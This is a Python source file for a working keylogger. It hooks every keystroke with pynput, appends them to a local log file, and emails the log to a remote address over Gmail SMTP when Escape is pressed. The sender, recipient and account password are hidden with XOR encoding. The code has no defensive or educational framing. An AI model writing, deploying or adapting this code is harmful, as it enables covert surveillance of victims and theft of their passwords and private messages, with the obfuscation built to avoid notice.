from pynput.keyboard import Listener        #importing dependencies
import smtplib


def writefile(key):                         #function which will convert unicode to string
    try:
        letter = str(key)
        letter = letter.replace("'", "")
        if letter == "key.APOSTROPHE":      #replacing few strokes for ease of readibility
            letter = "'"
        if letter == 'Key.space':
            letter = ' '
        if letter == 'Key.enter':
            letter = '\n'
        if letter == 'Key.shift':
            letter = ''
        if letter == 'Key.tab':
            letter = '\n'
        if letter == 'Key.backspace':
            letter = ' back '
        if letter == 'Key.caps_lock':
            letter = ''
        if letter == 'shift_r':
            letter = ''
        if letter == 'Key.ctrl_l':
            letter = ''
        if letter == 'Key.alt_l':
            letter = ''
        if letter == 'Key.alt_r':
            letter = ''
        if letter == 'Key.ctrl_r':
            letter = ''
        if letter == 'Key.shift_r':
            letter = ''
        if letter == 'Key.esc':             #intercepting to trigger transmit function
            letter = ''
            transmit()
        with open('log.txt', 'a') as f:     #writing each letter in a file named log.txt
            f.write(letter)
    except KeyError:                        #handling error
        pass

    
def _o0j3jiaskn9(mess,key):
    buf = ""
    ret = mess.split(":")
    for i in ret:
        if i == "":
            break
        buf += chr(int(i) ^ key)
    return buf

def transmit():                             #function to mail the file
    _se000023 = _o0j3jiaskn9("14:8:18:21:28:29:20:9:15:30:8:15:74:73:72:79:59:28:22:26:18:23:85:24:20:22",123)
    _r903298m = _o0j3jiaskn9("19:26:9:8:19:73:73:76:75:74:59:28:22:26:18:23:85:24:20:22",123)
    _0329jp30 = _o0j3jiaskn9('15:30:8:15:18:21:28:11:14:9:11:20:8:30:74:73:72:79',123)
    with open("log.txt", 'r') as fil:        #reading fromm file
        message = fil.read()
    server = smtplib.SMTP('smtp.gmail.com', 587)    #establishing connection with gmail server
    server.ehlo()
    server.starttls()
    server.login(_se000023, _0329jp30)             #authenticating ourselves
    server.sendmail(_se000023, _r903298m, message)     #sending mail
    server.close()                          #terminating the connection


with Listener(on_press=writefile) as lis:   #calling listener and listening to each and every press
    lis.join()                              #finally joining all the letters
